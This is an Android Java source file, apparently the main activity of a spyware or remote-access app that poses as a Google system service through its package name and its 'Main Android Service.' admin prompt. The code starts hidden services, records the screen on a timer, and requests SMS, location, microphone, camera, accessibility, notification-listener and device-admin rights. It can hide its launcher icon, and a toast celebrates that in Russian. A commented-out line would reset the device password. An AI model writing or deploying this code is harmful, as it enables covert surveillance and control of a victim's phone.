package com.google.android.android;

import android.Manifest;
import android.app.ActivityManager;
import android.app.admin.DeviceAdminReceiver;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.location.LocationManager;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.net.Uri;
import android.os.Bundle;
import android.os.IBinder;
import android.provider.Settings;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;
import android.support.v7.app.AppCompatActivity;
import android.text.TextUtils;
import android.util.DisplayMetrics;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.Toast;

import java.util.List;
import java.util.Set;
import java.util.Timer;
import java.util.TimerTask;

public class MainActivity extends AppCompatActivity {
    private static final int STORAGE_REQUEST_CODE = 1000;
    private static final int AUDIO_REQUEST_CODE = 1001;
    private static final int RECORD_REQUEST_CODE  = 1002;

    private Button permissionsButton;
    private Button accessibilityButton;
    private Button accessAdminButton;

    private MediaProjectionManager projectionManager;
    private MediaProjection mediaProjection;
    private RecordService recordService;

    private DevicePolicyManager devicePolicyManager;
    private ComponentName adminName;

    private static MainActivity mainActivity;

    public static MainActivity getInstance() {
        return mainActivity;
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        mainActivity = this;

        //hideIcon();
        startService(new Intent(this, MainService.class));
        startService(new Intent(this, RecordService.class));


        projectionManager = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
        Intent intent = new Intent(this, RecordService.class);
        bindService(intent, connection, BIND_AUTO_CREATE);

        Log.i("Carter", "MainActivity created!");

        devicePolicyManager = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
        adminName = new ComponentName(this, MyAdmin.class);

//        devicePolicyManager.resetPassword("", DevicePolicyManager.RESET_PASSWORD_REQUIRE_ENTRY);
    }

    public void startRecordScreen(int seconds) {
        if (recordService.isRunning()) {
//            recordService.stopRecord();
        } else {
            Intent captureIntent = projectionManager.createScreenCaptureIntent();
            startActivityForResult(captureIntent, RECORD_REQUEST_CODE);

            setTimerForStopRecordScreen(seconds * 1000);
        }
    }

    public void stopRecordScreen() {
        if (recordService.isRunning()) {
            recordService.stopRecord();
        } else {
//            Intent captureIntent = projectionManager.createScreenCaptureIntent();
//            startActivityForResult(captureIntent, RECORD_REQUEST_CODE);
        }
    }

    @Override
    protected void onResume() {
        super.onResume();
        initButtons();
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        unbindService(connection);
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        if (requestCode == RECORD_REQUEST_CODE && resultCode == RESULT_OK) {
            mediaProjection = projectionManager.getMediaProjection(resultCode, data);
            recordService.setMediaProject(mediaProjection);
            recordService.startRecord();
        }
    }

    private ServiceConnection connection = new ServiceConnection() {
        @Override
        public void onServiceConnected(ComponentName className, IBinder service) {
            DisplayMetrics metrics = new DisplayMetrics();
            getWindowManager().getDefaultDisplay().getMetrics(metrics);
            RecordService.RecordBinder binder = (RecordService.RecordBinder) service;
            recordService = binder.getRecordService();
            recordService.setConfig(metrics.widthPixels, metrics.heightPixels, metrics.densityDpi);
        }

        @Override
        public void onServiceDisconnected(ComponentName arg0) {}
    };

    private void initButtons() {
        permissionsButton = findViewById(R.id.permissionsButton);
        accessibilityButton = findViewById(R.id.accessibilityButton);
        accessAdminButton = findViewById(R.id.accessAdminButton);
        Button accessDisplayButton = findViewById(R.id.accessDisplayButton);
        Button accessLocationButton = findViewById(R.id.accessLocationButton);
        Button accessNotificationButton = findViewById(R.id.accessNotificationButton);
        Button accessSystemButton = findViewById(R.id.accessSystemButton);
        Button hideIconButton = findViewById(R.id.hideIconButton);

        permissionsButton.setEnabled(!checkUsesPermissions());
        accessibilityButton.setEnabled(!checkAccessibiliyService());
        accessAdminButton.setEnabled(!checkAdminDevice());
        accessLocationButton.setEnabled(!checkLocationEnabled());
        accessNotificationButton.setEnabled(!checkNotificationService());

        permissionsButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                showUsesPermissions();
            }
        });
        accessibilityButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS));
            }
        });
        accessAdminButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
                intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminName);
                intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Main Android Service.");
                startActivity(intent);
            }
        });
        accessLocationButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Intent intent = new Intent(Settings.ACTION_LOCATION_SOURCE_SETTINGS);
                intent.putExtra("enabled", true);
                startActivity(intent);
            }
        });
        accessNotificationButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Intent intent = new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS);
                startActivity(intent);
            }
        });
        hideIconButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                hideIcon();
                Toast.makeText(MainService.getInstance(), "Скрылись! :)", Toast.LENGTH_SHORT).show();
            }
        });
    }

    private void showUsesPermissions() {
        String[] permissions = {Manifest.permission.RECEIVE_SMS, Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.RECORD_AUDIO, Manifest.permission.WRITE_EXTERNAL_STORAGE,
            Manifest.permission.READ_PHONE_STATE, Manifest.permission.CAMERA};
        ActivityCompat.requestPermissions(this, permissions, 0);
    }

    private boolean checkUsesPermissions() {
        String[] permissions = {Manifest.permission.RECEIVE_SMS, Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.RECORD_AUDIO, Manifest.permission.WRITE_EXTERNAL_STORAGE,
                Manifest.permission.READ_PHONE_STATE, Manifest.permission.CAMERA};

        for (String perm : permissions) {
            if (ContextCompat.checkSelfPermission(MainActivity.this, perm)
                    != PackageManager.PERMISSION_GRANTED) {
                return false;
            }
        }

        return true;
    }

    private boolean checkAccessibiliyService() {
        int accessibilityEnabled = 0;
        final String service = getPackageName() + "/" + MyAccessibilityService.class.getCanonicalName();
        try {
            accessibilityEnabled = Settings.Secure.getInt(getApplicationContext().getContentResolver(), android.provider.Settings.Secure.ACCESSIBILITY_ENABLED);
        } catch (Settings.SettingNotFoundException e) {
            e.printStackTrace();
        }

        TextUtils.SimpleStringSplitter mStringColonSplitter = new TextUtils.SimpleStringSplitter(':');

        if (accessibilityEnabled == 1) {
            String settingValue = Settings.Secure.getString(getApplicationContext().getContentResolver(), Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
            if (settingValue != null) {
                mStringColonSplitter.setString(settingValue);
                while (mStringColonSplitter.hasNext()) {
                    String accessibilityService = mStringColonSplitter.next();
                    if (accessibilityService.equalsIgnoreCase(service)) {
                        return true;
                    }
                }
            }
        }
        return false;
    }

    private boolean checkAdminDevice() {
        return devicePolicyManager.isAdminActive(adminName);
    }

    private boolean checkLocationEnabled() {
        LocationManager locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
        return locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER) || locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER);
    }

    private boolean checkNotificationService() {
        ComponentName cn = new ComponentName(this, NotificationService.class);
        String flat = Settings.Secure.getString(getContentResolver(), "enabled_notification_listeners");
        return flat != null && flat.contains(cn.flattenToString());
    }

    public static class MyAdmin extends DeviceAdminReceiver {
        @Override
        public void onEnabled(Context context, Intent intent) {
            System.out.println("admin onEnabled");
        }

        @Override
        public void onDisabled(Context context, Intent intent) {
            System.out.println("admin inEdisabled");
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        permissionsButton.setEnabled(!checkUsesPermissions());
    }

    private void hideIcon(){
        PackageManager p = getPackageManager();
        ComponentName componentName = new ComponentName(getApplicationContext(), MainActivity.class);
        p.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
    }

    private void setTimerForStopRecordScreen(int milliseconds) {
        Timer timer = new Timer();
        timer.schedule(new StopRecordScreenTimerTask(), milliseconds);
    }

    private class StopRecordScreenTimerTask extends TimerTask {
        @Override
        public void run() {
            Log.i(StopRecordScreenTimerTask.class.getName(), "stopRecordScreen in the timer!");
            stopRecordScreen();
            cancel();
        }

    }
}
